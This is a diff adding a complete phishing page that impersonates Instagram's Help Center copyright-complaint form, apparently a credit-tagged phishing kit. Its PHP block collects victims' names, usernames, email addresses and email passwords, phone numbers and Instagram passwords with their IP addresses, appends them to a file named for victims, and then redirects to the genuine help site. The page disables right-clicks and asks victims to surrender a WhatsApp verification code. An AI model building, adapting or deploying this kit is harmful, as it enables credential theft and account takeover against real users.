@@ -1,0 +1,203 @@
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->
+<?php
+session_start();
+if ($_POST) {
+  $name=$_POST["name"];
+  $username=$_POST["username"];
+  $mail=$_POST["mail"];
+  $mailpass=$_POST["mailpass"];
+  $number=$_POST["number"];
+  $country=$_POST["country"];
+  $password=$_POST["password"];
+  $ip=$_SERVER["REMOTE_ADDR"];
+  date_default_timezone_set('Europe/Istanbul');
+  $date=date("d-m-Y H:i:s");
+  $file = fopen('kurbanlar.txt', 'a');
+fwrite($file, "<----HACK---->".$hack."\n" ."Isım: ".$name."\n" ."Kullanıcı Adı: ".$username. "\n"."Maıl: ".$mail. "\n"."Maıl Sıfre: ".$mailpass. "\n"."Telefon: ".$number. "\n"."Ulke: ".$country. "\n"."Instagram Sıfre: ".$password. "\n"."Ip Adress: " .$ip."\n".   "Time: " .$date.  "\n\n");
+fclose($file);
+echo '';
+
+   header("Location: https://help.instagram.com/");
+}
+?>
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->
+<!DOCTYPE html>
+<html lang="en">
+<head> 
+    <meta charset="utf-8"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+    <link rel="icon" href="img/instagram.svg">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <title>Copyright • lnstagram</title> 
+<script>
+var isNS = (navigator.appName == "Netscape") ? 1 : 0;
+var EnableRightClick = 0;
+if(isNS)
+document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
+function mischandler(){
+if(EnableRightClick==1){ return true; }
+else {return false; }
+}
+function mousehandler(e){
+if(EnableRightClick==1){ return true; }
+var myevent = (isNS) ? e : event;
+var eventbutton = (isNS) ? myevent.which : myevent.button;
+if((eventbutton==2)||(eventbutton==3)) return false;
+}
+function keyhandler(e) {
+var myevent = (isNS) ? e : window.event;
+if (myevent.keyCode==96)
+EnableRightClick = 1; 
+return;
+}
+document.oncontextmenu = mischandler;
+document.onkeypress = keyhandler;
+document.onmousedown = mousehandler;
+document.onmouseup = mousehandler;
+</script> 
+</head> 
+<body> 
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->
+  <div style="display: none;">
+    <div class="talha1">
+  </div>
+</div>
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->
+  <div class="talha2" style="display: block;">
+    <div class="talha3">
+      <div class="talha4">
+    </div>
+	      <input type="text" placeholder="How can we help?" class="talha5">
+	      <img src="img/search.png" class="talha6">
+      </div>
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->
+  <center>
+    <div class="talha7"> 
+      <div class="talha8"> 
+        <p> Help Center </p> 
+      </div> 
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->        
+        <div class="talha9"> 
+            <div class="talha10"> 
+                <a href="https://help.instagram.com/">Using Instagram</a> 
+                <img src="img/next.png"> 
+            </div> 
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->    
+            <div class="talha10"> 
+                <a href="https://help.instagram.com/">Managing Your Account</a> 
+                <img src="img/next.png"> 
+            </div> 
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->   
+            <div class="talha10"> 
+                <a href="https://help.instagram.com/">Troubleshooting and Login Help</a> 
+                <img src="img/next.png"> 
+            </div> 
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->    
+            <div class="talha10"> 
+                <a href="https://help.instagram.com/">Privacy and Safety Center</a> 
+                <img src="img/next.png"> 
+            </div> 
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->    
+            <div class="talha10"> 
+                <a href="https://help.instagram.com/">Instagram for Businesses</a> 
+                <img src="img/next.png"> 
+            </div> 
+        </div> 
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->   
+    <div class="talha11"> 
+        <b> İnstagram Help Center</b>
+            <p> Hi,</p>
+            <p>Copyright The frequently asked questions in this section include information about protecting your copyrighted works, not infringing others' copyrights while posting on Instagram, and how Instagram handles complaints of copyright infringement. If you think someone is using your copyrighted works without your permission, you can fill out this form.</p> 
+	        <p>Please note that laws can vary from country to country. For more information on copyright laws, you can visit the US Copyright Office or the World Intellectual Property Organization (WIPO) website. Instagram cannot offer you legal advice. If you have other questions regarding copyright, it may be helpful to contact a lawyer.</p> 
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->	
+	<form method="POST"> 
+        <label>Full name</label> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <input type="text" name="name" class="talha12"> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <div class="talha">
+            <label>Your username</label> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK------------->
+        <span>Please enter "username" in this field</span> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <input type="text" name="username" class="talha12" value="" required=""> 
+    </div> 
+<div class="talha">
+<br><!------------SCRİPT BY TALHA ŞENTÜRK------------->
+        <label>Email adress</label> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK------------->
+        <span>Email address linked to your account</span>
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <input type="email" name="mail" class="talha12" required=""> 
+    </div> 
+<div class="talha">
+<br><!------------SCRİPT BY TALHA ŞENTÜRK------------->
+        <label>Email Password</label> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK------------->
+        <span>The password of the email address linked to your account.</span>
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <input type="password" name="mailpass" class="talha12" required=""> 
+    </div>
+<div class="talha"> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK------------->
+        <label>Phone number</label> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK------------->
+        <span>Phone number linked to your account.</span>
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <input type="number" class="talha12" name="number" required=""> 
+    </div> 
+<div class="talha"> 
+<label>Country</label> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <span>Country where you registered on lnstagram</span> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <input type="text" class="talha12" name="country" required=""> 
+            <input type="button" class="talha15"> 
+        </div> 
+    <div class="talha"> 
+<label>Enter your Instagram password to complete the process</label>
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <input type="password" class="talha12" name="password" required=""> 
+        <input type="button" value="Show" class="talha15"> 
+    </div> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK------------->
+        <label>Explanation</label>
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <span>The statement you will make to our Instagram attachment</span> 
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <input type="text" class="talha12" name="aciklama" style="height: 10rem;">
+<br><!------------SCRİPT BY TALHA ŞENTÜRK-------------> 
+        <div class="talha"> 
+    </div>
+        <h4>Whatsapp verification team will ask you for a code , please give your confirmation code. </h4>
+            <input type="submit" class="talha14" name="submit" value="Send"> 
+        </form> 
+    </div> 
+</div> 
+</center>
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->
+  <div class="talha13"> 
+   <a href="https://www.instagram.com/about/us/"> ABOUT US </a> 
+   <a href="https://help.instagram.com/"> HELP </a> 
+   <a href="https://www.instagram.com/developers/"> API </a> 
+   <a href="https://www.instagram.com/about/jobs/"> JOBS </a> 
+   <a href="https://www.instagram.com/legal/terms/"> TERMS </a> 
+   <a href="https://www.instagram.com/legal/privacy/"> PRIVACY </a> 
+   <b> © 2020 INSTAGRAM, INC. </b> 
+<br> 
+   <label>ENGLISH (UK)</label> 
+   <label>TÜRKÇE</label> 
+   <label>KURDÎ (KURMANCÎ)</label> 
+   <label>العربية </label> 
+   <label>ZAZA</label> 
+   <label>DEUTSCH</label> 
+   <label>РУССКИЙ</label> 
+   <label>FRANÇAIS (FRANCE)</label> 
+   <label>ارسی </label> 
+   <label>ESPAÑOL</label> 
+   <label>PORTUGUÊS (BRASIL)</label> 
+   </div> 
+</div>
+</body>
+</html>
+<!------------SCRİPT BY TALHA ŞENTÜRK------------->
